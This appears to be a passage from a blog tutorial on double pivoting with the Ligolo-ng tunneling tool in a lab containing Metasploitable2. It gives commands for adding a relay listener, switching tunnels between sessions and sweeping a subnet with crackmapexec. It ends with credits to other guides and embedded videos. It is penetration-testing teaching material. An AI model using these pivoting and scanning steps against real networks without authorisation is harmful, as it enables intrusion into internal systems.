![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjK5CSrh9xf40HZhnMpKJOVmLWu6Ih6izinwV9wILTtSIUk3bQtxcXrNR-OBUZkVkFNegY8N1L8mV43-GC1oppSH75LeLhrWPRUuwYJQ8adb8_SK_y-R5TezleMVoNKweIt5JbNF_qjT3J76qAfvahVtMTy7Tai__NrFFHBXTeJ7faxMf4PH-51DNkKcPR/s16000/18.png)

With the modification of our IP route, the next step involves the addition of a listener to traverse the intra-network and retrieve the session. To incorporate the listener, utilize the following command:

listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0EQ-LBMVYiwpRsauiwi6Ej3mLqmC0bqZDREvVMerjrEgZrhF5-xQoS4SuArJmRiADGN-LJh421uPN6R1O56f3dbcrJjYijTlxu0UpJJRadiMoz1xOXZSw3QjuMB7Zxs30uherw8YlmKebwuE8NuUrDBiB3oZo2SrMTTelb-_tBZWlPANgzhilXLdFBaA5/s16000/19.png)

The image above confirms the activation of the listener. To initiate tunneling, refer to available options using the help command. It becomes evident that halting the ongoing tunneling in session 1 is necessary before starting the process in session 2. This step-by-step approach facilitates the transfer of data to the listener, which subsequently retrieves the necessary information. This operational technique, known as double pivoting, involves stopping the initial tunneling in the **first session** using the ‘**stop**‘ command. In **second session**, execute the ‘**start**‘ command, following the steps illustrated in the image below.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmjBIek4F4wDvqcxVj8idQWBsPolKvG8rB7t3aWpI_i1j4XcGHqIC1LjgIswPoQ40Y29H3KjgpxiBC63sOOqAaDPRTtxsnOBNOEDYximhczBQbI_1JrlRFRhme7aWF0TutnshsaGyT-sH1PSmn9gVCFH_PWmT8mQdPc78cfTpqJdH1Jpzr5Zhai7M_6YGI/s16000/20.png)

Executing double pivoting was successful, and its verification occurred through the utilization of crackmapexec with the command:

crackmapexec smb 192.168.159.0/24

Discovering Metasploitable2 within the network followed. This led to the ability to conduct a ping and nmap scan, leveraging the acquired network access, as illustrated in the image below:

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCmFuqFciCVNXpg4k9k5z1qQX1F8ETbVr_c0514mqSZm8omn7zCjuz7ovWHUlC58YLsUgfrvo_1h27I23lryQvHFYHe2LPbD3UDT6EApXSs2zzvSe84JSXNWaRZMzrykBFMnYGXiH6hF7d5BaCRomSM_DE_HCwwyBlxmH8SsUP1lRRv3GsHYmyb9v_Wjpt/s16000/22.png)

**Credit:** This information was adapted from an excellent guide on [HackingArticles.in](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/qou7shRlX_s?si=raFPSOjkxYfPhfPR" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=qou7shRlX_s). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/DM1B8S80EvQ?si=oPwilLg_-HXfCwz8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=DM1B8S80EvQ). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/ZQPy8adEQZ8?si=95pJllJEKY4p7Ge8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=ZQPy8adEQZ8). Be sure to check out the original post for more details.

